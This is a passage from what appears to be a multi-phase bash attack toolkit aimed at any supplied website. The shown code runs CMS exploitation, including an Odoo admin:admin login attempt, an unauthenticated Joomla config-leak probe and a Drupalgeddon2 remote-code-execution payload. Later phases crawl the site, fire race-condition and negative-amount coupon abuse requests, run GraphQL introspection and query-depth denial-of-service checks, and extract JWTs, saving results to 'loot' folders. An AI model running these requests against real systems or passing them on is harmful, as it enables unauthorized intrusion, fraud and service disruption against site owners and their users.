  curl -s --max-time 5 "$TARGET/storage/logs/laravel.log" 2>/dev/null | grep -qiE 'production|ERROR|password|token' && \
    echo "🔴 [LOG LEAK] storage/logs/laravel.log exposed with sensitive data"

  # RCE via log injection + phar deserialization
  echo "--- Log Injection → Phar Deserialize (CVE-2021-3129 chain) ---"
  LOG_FILE="$OUTDIR/loot/laravel-log.txt"
  curl -s --max-time 5 "$TARGET/storage/logs/laravel.log" 2>/dev/null | head -50 > "$LOG_FILE"
  [ -s "$LOG_FILE" ] && echo "  Log file accessible, check for PHAR deserialization vectors"
fi

# ============================================================
# ODOO CRM — FULL EXPLOITATION
# ============================================================
if [ "$CMS" = "Odoo" ] || curl -s --max-time 3 "$TARGET/web/login" 2>/dev/null | grep -qiE 'odoo|Odoo'; then
  echo ""
  echo "████████████████████████████████████"
  echo "  ODOO CRM EXPLOITATION"
  echo "████████████████████████████████████"

  # Version detection
  ODOO_VER=$(curl -s --max-time 5 "$TARGET/web/webclient/version_info" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('server_version','?'))" 2>/dev/null)
  echo "Odoo Version: ${ODOO_VER:-unknown}"

  # XML-RPC version leak
  XMLRPC_ODOO=$(curl -s --max-time 5 -X POST \
    -H "Content-Type: text/xml" \
    -d '<?xml version="1.0"?><methodCall><methodName>version</methodName></methodCall>' \
    "$TARGET/xmlrpc/2/common" 2>/dev/null)
  echo "$XMLRPC_ODOO" | grep -oP 'server_version.*?value>\K[^<]+' | head -1
  echo "$XMLRPC_ODOO" | grep -qiE 'server_version|odoo' && echo "🔴 [ODOO RPC] XML-RPC accessible — version info & potential DB enum"

  # Database enumeration
  echo "--- Database Enumeration ---"
  DB_LIST=$(curl -s --max-time 5 -X POST \
    -H "Content-Type: text/xml" \
    -d '<?xml version="1.0"?><methodCall><methodName>db_list</methodName></methodCall>' \
    "$TARGET/xmlrpc/2/common" 2>/dev/null)
  echo "$DB_LIST" | grep -oP '<value><string>\K[^<]+' | head -10
  echo "$DB_LIST" | grep -qiE 'value|string' && echo "  ⚠️  DB list accessible — potential db enumeration"

  # Check Odoo specific paths
  echo "--- Odoo Paths ---"
  for p in /web/database/manager /web/database/selector /web/session/authenticate /jsonrpc /longpolling/poll /longpolling/im /maintenance /web/database/list; do
    curl -s --max-time 3 "$TARGET$p" -o /dev/null -w "%{http_code}" | grep -qv '404' && echo "[$STATUS] $TARGET$p"
  done

  # Default credentials check
  echo "--- Default Credentials ---"
  DEFAULT_LOGIN=$(curl -s --max-time 5 -X POST \
    -H "Content-Type: application/json" \
    -d '{"jsonrpc":"2.0","method":"call","params":{"db":"odoo","login":"admin","password":"admin"}}' \
    "$TARGET/web/session/authenticate" 2>/dev/null)
  echo "$DEFAULT_LOGIN" | grep -qi 'uid' && echo "🔴 [ODOO DEFAULT] admin:admin works!"
  echo "$DEFAULT_LOGIN" | grep -qi 'uid' && echo "[ODOO] default creds admin:admin" >> "$OUTDIR/loot/findings.txt"
fi

# ============================================================
# JOOMLA — EXPLOITATION
# ============================================================
if [ "$CMS" = "Joomla" ] || curl -s --max-time 3 "$TARGET/administrator/" 2>/dev/null | grep -qiE 'Joomla|joomla'; then
  echo "--- Joomla Exploitation ---"
  J_VER=$(curl -s --max-time 5 "$TARGET/administrator/manifests/files/joomla.xml" 2>/dev/null | grep -oP '<version>\K[^<]+')
  echo "Joomla version: ${J_VER:-unknown}"

  # CVE check
  [ -n "$J_VER" ] && {
    JFULL=$(echo "$J_VER" | tr -d '.')
    [ "$JFULL" -lt 4000 ] && echo "  ⚠️  <4.0 — CVE-2023-23752(Unauthenticated info leak)"
    [ "$JFULL" -lt 4003 ] && echo "  ⚠️  <4.0.3 — CVE-2021-23132(com_fields SQLi)"
    [ "$JFULL" -lt 3010 ] && echo "  ⚠️  <3.10 — CVE-2021-26034(XXE)"
  }

  # CVE-2023-23752 test
  curl -s --max-time 5 "$TARGET/api/index.php/v1/config/application" 2>/dev/null | grep -qiE 'password|api|host|db_' && \
    echo "🔴 [CVE-2023-23752] Unauthenticated API access!"
fi

# ============================================================
# DRUPAL — EXPLOITATION
# ============================================================
if [ "$CMS" = "Drupal" ] || curl -s --max-time 3 "$TARGET/CHANGELOG.txt" 2>/dev/null | grep -qiE 'Drupal'; then
  echo "--- Drupal Exploitation ---"
  D_VER=$(curl -s --max-time 5 "$TARGET/CHANGELOG.txt" 2>/dev/null | grep -oP 'Drupal \K[0-9.]+' | head -1)
  echo "Drupal version: ${D_VER:-unknown}"

  # Drupalgeddon check
  if [ -n "$D_VER" ]; then
    DFULL=$(echo "$D_VER" | tr -d '.')
    [ "$DFULL" -lt 732 ] && echo "🔴 Drupalgeddon (CVE-2014-3704) — SQLi via form API"
    [ "$DFULL" -lt 758 ] && echo "🔴 Drupalgeddon2 (CVE-2018-7600) — RCE"
    [ "$DFULL" -lt 760 ] && echo "🔴 Drupalgeddon3 (CVE-2018-7602) — RCE via forms"
    [ "$DFULL" -lt 800 ] && echo "  ⚠️  Pre-8.x — multiple critical vulns"
  fi

  # Drupalgeddon2 PoC
  DRUPAL_RCE=$(curl -s --max-time 5 -X POST \
    -d "user_password%5B%23post_render%5D%5B%5D=exec&user_password%5B%23type%5D=markup&user_password%5B%23markup%5D=id&name%5B%23post_render%5D%5B%5D=exec&name%5B%23type%5D=markup&name%5B%23markup%5D=id&form_id=user_pass&_triggering_element_name=name" \
    "$TARGET/user/password" 2>/dev/null)
  echo "$DRUPAL_RCE" | grep -qiE 'uid=|gid=|www-data' && echo "🔴 [DRUPALGEDDON2] RCE confirmed!"
fi

echo "=== CMS/CRM EXPLOITATION DONE ==="
```

---

### ════════════════════════════════════════════════════════
###  PHASE 2B: SUPPLY CHAIN & DEPENDENCY ATTACK
### ════════════════════════════════════════════════════════

```bash
TARGET="$ARGUMENTS"
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | sed 's|/.*||')
BASE=$(echo "$DOMAIN" | sed 's|^www\.||')

# === GITEST: Hybrid SCAN_DIR resolution ===
if [ -n "$GITEST_SCAN_DIR" ]; then
  SCAN_BASE="$GITEST_SCAN_DIR"
elif [ -d "$HOME/SCAN" ]; then
  SCAN_BASE="$HOME/SCAN"
else
  SCAN_BASE="$(pwd)/SCAN"
fi
OUTDIR="$SCAN_BASE/targets/$BASE"
mkdir -p "$OUTDIR"/{recon,loot,exploits,reports,screenshots,payloads}

echo "████████████████████████████████████████████████████"
echo "  PHASE 2B: SUPPLY CHAIN & DEPENDENCY ATTACK"
echo "████████████████████████████████████████████████████"

HOMEPAGE=$(curl -s --max-time 15 "$TARGET" 2>/dev/null)
HEADERS=$(curl -sI --max-time 10 "$TARGET" 2>/dev/null)

# ── Extract All Third-Party JS/Services ──
echo "--- Third-Party Service Enumeration ---"
declare -a THIRD_PARTY
THIRD_PARTY+=($(echo "$HOMEPAGE" | grep -oP 'src="https?://[^/"]+' | sed 's|src="||' | sort -u))
THIRD_PARTY+=($(echo "$HOMEPAGE" | grep -oP 'href="https?://[^/"]+' | sed 's|href="||' | sort -u))
THIRD_PARTY+=($(echo "$HOMEPAGE" | grep -oP 'https?://[^/"]*\.js['"'"'"]' | sed 's/.$//' | sort -u))
printf '%s\n' "${THIRD_PARTY[@]}" | grep -v "$BASE" | grep -v "$DOMAIN" | sort -u > "$OUTDIR/loot/third-party.txt"

while IFS= read -r svc; do
  echo "  Third-party: $svc"

  # CDN integrity check (SRI)
  SCRIPT_TAG=$(echo "$HOMEPAGE" | grep -F "$svc")
  if echo "$SCRIPT_TAG" | grep -qi 'integrity='; then
    echo "    ✅ SRI integrity hash present"
  else
    echo "    ❌ SRI MISSING — supply chain risk (CDN compromise would affect all users)"
    echo "[SUPPLY CHAIN] No SRI integrity on $svc" >> "$OUTDIR/loot/findings.txt"
  fi
done < "$OUTDIR/loot/third-party.txt"

# ── Dependency Confusion (npm/pip/composer) ──
echo "--- Dependency Confusion Testing ---"
# Look for private package references
for manifest in /package.json /composer.json /Gemfile /requirements.txt /Pipfile /go.mod /Cargo.toml /yarn.lock /package-lock.json; do
  MANIFEST_DATA=$(curl -s --max-time 5 "$TARGET$manifest" 2>/dev/null)
  if [ -n "$MANIFEST_DATA" ]; then
    echo "[MANIFEST] $manifest available"
    echo "$MANIFEST_DATA" > "$OUTDIR/loot/manifest-$(basename $manifest)"

    # Check for packages that look internal/private (could be dependency-confused)
    echo "$MANIFEST_DATA" | grep -oP '"@[^/]+/[^"]+"|"'"(?:private|internal|company|corp|org)[^"]*"' | head -20 > "$OUTDIR/loot/private-packages.txt"
    [ -s "$OUTDIR/loot/private-packages.txt" ] && \
      echo "  ⚠️  Potential private/internal packages — dependency confusion risk!" && \
      cat "$OUTDIR/loot/private-packages.txt" && \
      echo "[SUPPLY CHAIN] Potential dependency confusion: $(cat "$OUTDIR/loot/private-packages.txt" | tr '\n' ',')" >> "$OUTDIR/loot/findings.txt"
  fi
done

# ── CDN / Hosting Provider Check ──
echo "--- Infrastructure Vendor Analysis ---"
echo "$HEADERS" | grep -iE 'cf-ray|cloudflare|akamai|fastly|aws|azure|gcp|nginx|apache|iis|openresty' > "$OUTDIR/loot/infra-vendors.txt"
cat "$OUTDIR/loot/infra-vendors.txt"

# ── Outdated Library Detection ──
echo "--- Frontend Library Version Detection ---"
echo "$HOMEPAGE" | grep -oP 'jquery-?[0-9.]*\.js|jquery/[0-9.]+|react[./][0-9.]+|vue[./][0-9.]+|angular[./][0-9.]+|bootstrap[./][0-9.]+|lodash[./][0-9.]+|moment[./][0-9.]+|chart\.js[./][0-9.]+|axios[./][0-9.]+' | sort -u > "$OUTDIR/loot/js-libs.txt"
cat "$OUTDIR/loot/js-libs.txt"

# ── Known Compromise Check on Third Parties ──
echo "--- Third-Party Risk Assessment ---"
RISKY_SERVICES=("google-analytics" "facebook.net" "doubleclick" "hotjar" "optimizely" "newrelic" "cdnjs" "unpkg" "jsdelivr")
while IFS= read -r svc; do
  for risky in "${RISKY_SERVICES[@]}"; do
    if echo "$svc" | grep -qi "$risky"; then
      echo "  ⚠️  Risk: $svc — if this CDN/analytics provider is compromised, all sites using it are affected"
    fi
  done
done < "$OUTDIR/loot/third-party.txt"

# ── CSP Policy Analysis (supply chain mitigation) ──
echo "--- CSP Analysis ---"
CSP=$(echo "$HEADERS" | grep -i 'content-security-policy')
if [ -n "$CSP" ]; then
  echo "CSP present: ${CSP:0:200}..."
  echo "$CSP" | grep -qiE "'unsafe-inline'|'unsafe-eval'" && \
    echo "  ❌ CSP allows unsafe-inline/unsafe-eval — XSS mitigation weakened"
  echo "$CSP" | grep -qi "cdn\.example\.com\|self" && echo "  ✅ CSP restricts script sources"
else
  echo "  ❌ CSP MISSING — no protection against content injection/supply chain"
  echo "[SUPPLY CHAIN] CSP missing" >> "$OUTDIR/loot/findings.txt"
fi

echo "=== SUPPLY CHAIN ATTACK DONE ==="
```

---

### ════════════════════════════════════════════════════════
###  PHASE 2C: FULL SITE SPIDER & PAGE EXTRACTION
### ════════════════════════════════════════════════════════

```bash
TARGET="$ARGUMENTS"
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | sed 's|/.*||')
BASE=$(echo "$DOMAIN" | sed 's|^www\.||')

# === GITEST: Hybrid SCAN_DIR resolution ===
if [ -n "$GITEST_SCAN_DIR" ]; then
  SCAN_BASE="$GITEST_SCAN_DIR"
elif [ -d "$HOME/SCAN" ]; then
  SCAN_BASE="$HOME/SCAN"
else
  SCAN_BASE="$(pwd)/SCAN"
fi
OUTDIR="$SCAN_BASE/targets/$BASE"
mkdir -p "$OUTDIR"/{recon,loot,exploits,reports,screenshots,payloads}

echo "████████████████████████████████████████████████████"
echo "  PHASE 2C: FULL SITE CRAWL & PAGE EXTRACTION"
echo "████████████████████████████████████████████████████"

# ── Crawl homepage for initial links ──
echo "--- Crawling All Pages ---"
HOMEPAGE=$(curl -s --max-time 15 "$TARGET" 2>/dev/null)
declare -a PAGES
PAGES+=("$TARGET")

# Extract all internal links
INTERNAL_LINKS=$(echo "$HOMEPAGE" | grep -oP 'href="[^"]*"' | grep -oP '"[^"]+"' | tr -d '"' | grep -v '^#' | grep -v '^http' | grep -v '^mailto' | grep -v '^tel' | grep -v '^javascript' | sort -u)
for link in $INTERNAL_LINKS; do
  # Make absolute URL
  ABS_LINK="$TARGET"
  if [[ "$link" == /* ]]; then
    ABS_LINK="$TARGET$link"
  else
    ABS_LINK="$TARGET/$link"
  fi
  PAGES+=("$ABS_LINK")
done

# Also extract absolute internal URLs
ABSOLUTE_LINKS=$(echo "$HOMEPAGE" | grep -oP 'href="https?://[^"]*'"$BASE"'[^"]*"' | grep -oP 'https?://[^"]+' | sort -u)
for link in $ABSOLUTE_LINKS; do
  PAGES+=("$link")
done

# Deduplicate
printf '%s\n' "${PAGES[@]}" | sort -u > /tmp/all-pages.txt
wc -l < /tmp/all-pages.txt | xargs -I{} echo "Found {} unique pages to crawl"

# ── Crawl each discovered page (2 levels deep) ──
echo "--- Deep Crawl ---"
ALL_PAGES_FILE="/tmp/all-pages.txt"
ALL_PAGES=$(cat "$ALL_PAGES_FILE" 2>/dev/null)
ALL_FORMS=""
ALL_ENDPOINTS=""
ALL_JS=""

for page in $ALL_PAGES; do
  echo -n "."
  PAGE_CONTENT=$(curl -s --max-time 8 "$page" 2>/dev/null)
  [ -z "$PAGE_CONTENT" ] && continue

  # Save page content for analysis
  PAGE_NAME=$(echo "$page" | sed "s|$TARGET||" | tr '/' '_' | sed 's/^_//')
  [ -z "$PAGE_NAME" ] && PAGE_NAME="index"
  echo "$PAGE_CONTENT" > "/tmp/page_${PAGE_NAME::30}.txt" 2>/dev/null

  # Extract forms
  echo "$PAGE_CONTENT" | grep -oP '<form[^>]*>' | sort -u >> /tmp/all-forms.txt

  # Extract action endpoints
  echo "$PAGE_CONTENT" | grep -oP 'action="[^"]*"' | grep -oP '"[^"]+"' | tr -d '"' | sort -u >> /tmp/all-endpoints.txt

  # Extract API/meta endpoints
  echo "$PAGE_CONTENT" | grep -oP '"/api/[^"]*"' | tr -d '"' | sort -u >> /tmp/all-api-endpoints.txt

  # Extract JS
  echo "$PAGE_CONTENT" | grep -oP 'src="[^"]*\.js[^"]*"' | grep -oP '"[^"]+"' | tr -d '"' | sort -u >> /tmp/all-js.txt

  # Extract internal links from this page too (level 2)
  LEVEL2=$(echo "$PAGE_CONTENT" | grep -oP 'href="[^"]*"' | grep -oP '"[^"]+"' | tr -d '"' | grep -v '^#' | grep -v '^http' | grep -v '^mailto' | grep -v '^tel' | grep -v '^javascript' | grep -v '^//' | sort -u)
  for link in $LEVEL2; do
    ABS="$TARGET"
    [[ "$link" == /* ]] && ABS="$TARGET$link" || ABS="$TARGET/$link"
    echo "$ABS" >> /tmp/all-pages-lvl2.txt 2>/dev/null
  done
done
echo ""
echo "Crawl complete"

# ── Organize findings ──
echo "--- Organizing Results ---"
sort -u /tmp/all-forms.txt 2>/dev/null > "$OUTDIR/recon/all-forms.txt"
sort -u /tmp/all-endpoints.txt 2>/dev/null > "$OUTDIR/recon/all-endpoints.txt"
sort -u /tmp/all-api-endpoints.txt 2>/dev/null > "$OUTDIR/recon/all-api-endpoints.txt"
sort -u /tmp/all-js.txt 2>/dev/null > "$OUTDIR/recon/all-js-files.txt"
sort -u /tmp/all-pages-lvl2.txt 2>/dev/null >> /tmp/all-pages.txt
sort -u /tmp/all-pages.txt 2>/dev/null > "$OUTDIR/recon/all-pages.txt"

echo "Pages found: $(wc -l < "$OUTDIR/recon/all-pages.txt" 2>/dev/null || echo 0)"
echo "Forms found: $(wc -l < "$OUTDIR/recon/all-forms.txt" 2>/dev/null || echo 0)"
echo "Unique endpoints: $(wc -l < "$OUTDIR/recon/all-endpoints.txt" 2>/dev/null || echo 0)"
echo "API endpoints: $(wc -l < "$OUTDIR/recon/all-api-endpoints.txt" 2>/dev/null || echo 0)"
echo "JS files: $(wc -l < "$OUTDIR/recon/all-js-files.txt" 2>/dev/null || echo 0)"

# ── Scan each discovered endpoint ──
echo "--- Endpoint Vulnerability Scan ---"
ENDPOINTS=$(cat "$OUTDIR/recon/all-api-endpoints.txt" "$OUTDIR/recon/all-endpoints.txt" 2>/dev/null | sort -u | head -50)
for ep in $ENDPOINTS; do
  [[ "$ep" != http* ]] && ep="$TARGET$ep"
  STATUS=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" --max-time 3 "$ep" 2>/dev/null)
  echo "[$STATUS] $ep"
done

# ── Check for admin/hidden pages in crawl results ──
echo "--- Hidden/Admin Pages Found ---"
grep -iE 'admin|dashboard|cms|backup|config|setting|manager|control|private|secret|hidden|internal|partner|vendor|supplier|affiliate|agent|cpanel|whm|phpmyadmin|log|debug|test|dev|staging|beta' "$OUTDIR/recon/all-pages.txt" 2>/dev/null | head -30

echo "=== FULL SITE CRAWL DONE ==="
```

---

### ════════════════════════════════════════════════════════
###  PHASE 2D: BANNER, AD, PROMOTION & MODAL ATTACK
### ════════════════════════════════════════════════════════

```bash
TARGET="$ARGUMENTS"
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | sed 's|/.*||')
BASE=$(echo "$DOMAIN" | sed 's|^www\.||')

# === GITEST: Hybrid SCAN_DIR resolution ===
if [ -n "$GITEST_SCAN_DIR" ]; then
  SCAN_BASE="$GITEST_SCAN_DIR"
elif [ -d "$HOME/SCAN" ]; then
  SCAN_BASE="$HOME/SCAN"
else
  SCAN_BASE="$(pwd)/SCAN"
fi
OUTDIR="$SCAN_BASE/targets/$BASE"
mkdir -p "$OUTDIR"/{recon,loot,exploits,reports,screenshots,payloads}

echo "████████████████████████████████████████████████████"
echo "  PHASE 2D: BANNER/AD/MODAL/PROMO ATTACK"
echo "████████████████████████████████████████████████████"

HOMEPAGE=$(curl -s --max-time 15 "$TARGET" 2>/dev/null)
ALL_PAGES=$(cat "$OUTDIR/recon/all-pages.txt" 2>/dev/null || echo "$TARGET")

# ── Ad/Banner Container Detection ──
echo "--- Ad/Banner Container Detection ---"
BANNER_PATTERNS=("banner" "ads" "advertisement" "sponsor" "promo" "promotion" "modal" "popup" "overlay" "slide" "carousel" "slider" "offer" "campaign" "banner-container" "ad-container" "promo-bar" "announcement" "notification-bar" "top-banner" "header-banner" "footer-banner" "sidebar-ad" "inline-ad")

PAGE_CONTENT="$HOMEPAGE"
HAS_BANNER=false
for pattern in "${BANNER_PATTERNS[@]}"; do
  if echo "$PAGE_CONTENT" | grep -qiE "id=['\"][^'\"]*${pattern}[^'\"]*['\"]|class=['\"][^'\"]*${pattern}[^'\"]*['\"]"; then
    echo "  [BANNER] Found $pattern container"
    HAS_BANNER=true
  fi
done

echo "$HAS_BANNER" || echo "  No obvious ad containers found on homepage"

# ── Ad Provider / Network Detection ──
echo "--- Ad Network Detection ---"
AD_PROVIDERS=("doubleclick" "googlesyndication" "googleadservices" "googletagmanager" "adsrvr" "criteo" "taboola" "outbrain" "facebook.net" "meta" "adnxs" "rubicon" "openx" "pubmatic" "indexexchange" "appnexus" "amazon-adsystem" "adzerk" "casalemedia" "sojern" "tremorhub" "brightcove" "adsafeprotected" "moatads" "scorecardresearch" "quantserve" "comscore" "chartbeat" "crazyegg" "hotjar" "optimizely" "everesttech")
AD_SCRIPTS=""

for provider in "${AD_PROVIDERS[@]}"; do
  if echo "$PAGE_CONTENT" | grep -qi "$provider"; then
    echo "  [AD-NETWORK] $provider detected"
    AD_SCRIPTS+=" $provider"
  fi
done

# Check other crawled pages too
for page in $ALL_PAGES; do
  PC=$(curl -s --max-time 5 "$page" 2>/dev/null)
  for provider in "${AD_PROVIDERS[@]}"; do
    if echo "$PC" | grep -qi "$provider" && ! echo "$AD_SCRIPTS" | grep -qi "$provider"; then
      echo "  [AD-NETWORK] $provider detected on $page"
      AD_SCRIPTS+=" $provider"
    fi
  done
done 2>/dev/null

# ── Iframe / Ad Injection Check ──
echo "--- Iframe & Ad Injection Analysis ---"
echo "$PAGE_CONTENT" | grep -oP '<iframe[^>]*>' | head -20 > "$OUTDIR/loot/iframes.txt"
[ -s "$OUTDIR/loot/iframes.txt" ] && echo "Iframes found: $(wc -l < "$OUTDIR/loot/iframes.txt")" || echo "No iframes on homepage"

# Check for iframes without sandbox
echo "$PAGE_CONTENT" | grep -oP '<iframe[^>]*>' | grep -iv 'sandbox' | head -5 > /tmp/insecure-iframes.txt
[ -s /tmp/insecure-iframes.txt ] && echo "  ❌ Iframes without sandbox — clickjacking risk" && \
  echo "[AD/MODAL] Iframes without sandbox" >> "$OUTDIR/loot/findings.txt"
# Check for iframes with javascript: src
echo "$PAGE_CONTENT" | grep -oP '<iframe[^>]*src=["'"'"']javascript:' | head -3 && \
  echo "  ❌ Iframe with javascript: URI — XSS risk" && \
  echo "[AD/MODAL] Iframe javascript: URI" >> "$OUTDIR/loot/findings.txt"

# ── XSS via Ad Content (Banner injection) ──
echo "--- Ad Content Injection (Malvertising) ---"
# Check if ad content is dynamically rendered
echo "$PAGE_CONTENT" | grep -qiE 'document\.write.*ad|innerHTML.*ad|outerHTML.*ad|insertAdjacentHTML.*ad' && \
  echo "  ❌ Dynamic ad rendering via innerHTML — XSS if ad content is compromised"
echo "$PAGE_CONTENT" | grep -qiE '\.src\s*=\s*[^"'"'"']' && \
  echo "  ❌ Programmatic script/image src assignment — possible DOM-based XSS in ad code"

# JSONP callbacks in ad code
echo "$PAGE_CONTENT" | grep -oP '(?:callback|jsonp|jsoncallback)=[a-zA-Z0-9_.]+' | head -5 > /tmp/jsonp.txt
[ -s /tmp/jsonp.txt ] && echo "  ⚠️  JSONP callbacks found — potential JSONP injection" && cat /tmp/jsonp.txt

# ── Promo Code / Coupon Abuse Testing ──
echo "--- Promo/Coupon Code Attacks ---"
# Find promo endpoints
PROMO_PATTERNS=("coupon" "promo" "voucher" "discount" "offer" "promotion" "referral" "bonus" "cashback" "reward" "gift" "voucher" "promocode" "coupon_code" "discount_code" "giftcard" "gift_card")
for page in $ALL_PAGES; do
  PC=$(curl -s --max-time 5 "$page" 2>/dev/null)
  for pattern in "${PROMO_PATTERNS[@]}"; do
    if echo "$PC" | grep -qiE "action=['\"][^'\"]*${pattern}|url=['\"][^'\"]*${pattern}|href=['\"][^'\"]*${pattern}|api.*${pattern}|${pattern}.*api"; then
      ENDPOINT=$(echo "$PC" | grep -oP "action=['\"][^'\"]*${pattern}[^'\"]*['\"]|href=['\"][^'\"]*${pattern}[^'\"]*['\"]|url=['\"][^'\"]*${pattern}[^'\"]*['\"]" | head -1)
      echo "  [PROMO] $page → $ENDPOINT"
      echo "$ENDPOINT" >> "$OUTDIR/loot/promo-endpoints.txt"
    fi
  done
done 2>/dev/null

# Try coupon abuse (if promo endpoint found)
PROMO_ENDPOINTS=$(cat "$OUTDIR/loot/promo-endpoints.txt" 2>/dev/null | head -5)
for promo_ep in $PROMO_ENDPOINTS; do
  # Extract URL from attribute
  PROMO_URL=$(echo "$promo_ep" | grep -oP 'https?://[^"'"'"']+|/[a-zA-Z0-9_/]+' | head -1)
  [[ "$PROMO_URL" != http* ]] && PROMO_URL="$TARGET$PROMO_URL"

  # Test race condition on promo
  echo "  Testing race condition on $PROMO_URL..."
  for i in 1 2 3 4 5 6 7 8 9 10; do
    curl -s --max-time 5 -X POST -H "Content-Type: application/json" \
      -d "{\"code\":\"WELCOME50\",\"coupon\":\"TEST$i\"}" \
      "$PROMO_URL" &
  done
  wait
  echo "  Race test done — check output for duplicate coupon usage"

  # Test negative amount / manipulation
  curl -s --max-time 5 -X POST -H "Content-Type: application/json" \
    -d '{"code":"WELCOME50","amount":-100,"quantity":-1,"discount":99999}' \
    "$PROMO_URL" 2>/dev/null | head -5
done

# ── Modal/Popup Content Injection ──
echo "--- Modal/Popup Injection ---"
# Check if modal content is loaded dynamically
echo "$PAGE_CONTENT" | grep -iE 'data-target="#|data-toggle="modal|class="modal|data-backdrop|role="dialog"' | head -10 > "$OUTDIR/loot/modals.txt"
[ -s "$OUTDIR/loot/modals.txt" ] && echo "Modals found: $(wc -l < "$OUTDIR/loot/modals.txt")" || echo "No modals detected"

# Check for modal content loaded via AJAX (open to injection)
echo "$PAGE_CONTENT" | grep -iE '\.load\(|\.get\(|\.ajax\(\s*.*modal|modal.*\.ajax' | head -5 && \
  echo "  ⚠️  Modal loaded dynamically — potential content injection if URL is user-controlled"

# ── Click Fraud / Ad Fraud Vectors ──
echo "--- Click Fraud Vectors ---"
# Check for auto-redirects
echo "$PAGE_CONTENT" | grep -iE 'window\.location|meta.*http-equiv.*refresh' | head -5 && \
  echo "  ⚠️  Auto-redirects — possible click fraud / ad redirect"

# Check for invisible iframes/ads
echo "$PAGE_CONTENT" | grep -oP '<iframe[^>]*style=["'"'"'][^"'"'"']*(display\s*:\s*none|visibility\s*:\s*hidden|opacity\s*:\s*0|width\s*:\s*0|height\s*:\s*0)' | head -3 && \
  echo "  ❌ Invisible iframe — click fraud / ad stacking" && \
  echo "[AD] Invisible iframe — click fraud" >> "$OUTDIR/loot/findings.txt"

echo "=== BANNER/AD/MODAL ATTACK DONE ==="
```

---

### ════════════════════════════════════════════════════════
###  PHASE 3: API DEEP EXPLOITATION
### ════════════════════════════════════════════════════════

```bash
TARGET="$ARGUMENTS"
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | sed 's|/.*||')
BASE=$(echo "$DOMAIN" | sed 's|^www\.||')

# === GITEST: Hybrid SCAN_DIR resolution ===
if [ -n "$GITEST_SCAN_DIR" ]; then
  SCAN_BASE="$GITEST_SCAN_DIR"
elif [ -d "$HOME/SCAN" ]; then
  SCAN_BASE="$HOME/SCAN"
else
  SCAN_BASE="$(pwd)/SCAN"
fi
OUTDIR="$SCAN_BASE/targets/$BASE"
mkdir -p "$OUTDIR"/{recon,loot,exploits,reports,screenshots,payloads}

echo "████████████████████████████████████████████████████"
echo "  PHASE 3: API DEEP ATTACK"
echo "████████████████████████████████████████████████████"

# ── GraphQL Deep Dive ──
echo "--- GraphQL Attack ---"
GQL_ENDPOINTS=("/graphql" "/api/graphql" "/api/v1/graphql" "/v1/graphql" "/api/v2/graphql" "/gql" "/query" "/graph" "/api")

for gql in "${GQL_ENDPOINTS[@]}"; do
  # Introspection query
  GQL_RESP=$(curl -s --max-time 5 -X POST \
    -H "Content-Type: application/json" \
    -d '{"query":"query { __schema { types { name fields { name type { name kind } } } } }"}' \
    "$TARGET$gql" 2>/dev/null)

  if echo "$GQL_RESP" | grep -qiE '"data"|"__schema"|"types"'; then
    echo "🔴 [GRAPHQL INTROSPECTION] $TARGET$gql — introspection ENABLED"
    echo "[GRAPHQL] Introspection enabled at $gql" >> "$OUTDIR/loot/findings.txt"

    # Extract all types/fields
    echo "$GQL_RESP" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    types = d.get('data', {}).get('__schema', {}).get('types', [])
    for t in types:
        name = t.get('name', '')
        if not name.startswith('__'):
            fields = t.get('fields', [])
            fnames = [f.get('name','?') for f in fields[:10]]
            print(f'  {name}: {', '.join(fnames)}')
except: pass
" 2>/dev/null
  fi

  # Mutation discovery
  GQL_MUT=$(curl -s --max-time 5 -X POST \
    -H "Content-Type: application/json" \
    -d '{"query":"query { __schema { mutationType { fields { name } } } }"}' \
    "$TARGET$gql" 2>/dev/null)
  echo "$GQL_MUT" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    muts = d.get('data',{}).get('__schema',{}).get('mutationType',{})
    for f in muts.get('fields',[]):
        print(f'  Mutation available: {f.get(\"name\",\"?\")}')
except: pass
" 2>/dev/null

  # Query depth DoS
  DEPTH_PAYLOAD='{"query":"query { __schema { types { name fields { name type { name fields { name type { name } } } } } } }"}'
  DEPTH_RESP=$(curl -s --max-time 10 -w "%{http_code}:%{time_total}" -X POST -H "Content-Type: application/json" -d "$DEPTH_PAYLOAD" "$TARGET$gql" 2>/dev/null)
  echo "  Deep query response: $DEPTH_RESP"

  # Aliased query DoS
  ALIAS_PAYLOAD='{"query":"query { a1: __typename b1: __typename c1: __typename d1: __typename e1: __typename f1: __typename g1: __typename h1: __typename i1: __typename j1: __typename k1: __typename l1: __typename m1: __typename n1: __typename o1: __typename }"}'
  ALIAS_RESP=$(curl -s --max-time 10 -o /dev/null -w "%{http_code}:%{time_total}" -X POST -H "Content-Type: application/json" -d "$ALIAS_PAYLOAD" "$TARGET$gql" 2>/dev/null)
  echo "  Aliased query: $ALIAS_RESP"
done

# ── JWT Attack ──
echo "--- JWT Analysis ---"
# Extract JWT from headers/cookies
JWT=$(curl -sI "$TARGET" 2>/dev/null | grep -oP 'Bearer \K[^\s;]+')
[ -z "$JWT" ] && JWT=$(curl -sI "$TARGET" 2>/dev/null | grep -oP 'token=\K[^\s;]+')
[ -z "$JWT" ] && JWT=$(curl -sI "$TARGET" 2>/dev/null | grep -oP 'jwt=\K[^\s;]+')
[ -z "$JWT" ] && JWT=$(curl -s --max-time 5 "$TARGET" 2>/dev/null | grep -oP 'eyJ[A-Za-z0-9_-]{10,200}\.[A-Za-z0-9_-]{10,200}\.[A-Za-z0-9_-]{10,200}' | head -1)

if [ -n "$JWT" ]; then
  echo "JWT found: ${JWT:0:50}..."
  # Decode header
  echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null
  # Decode payload
  echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null

  # Check alg=none
  echo "--- Algorithm Confusion ---"
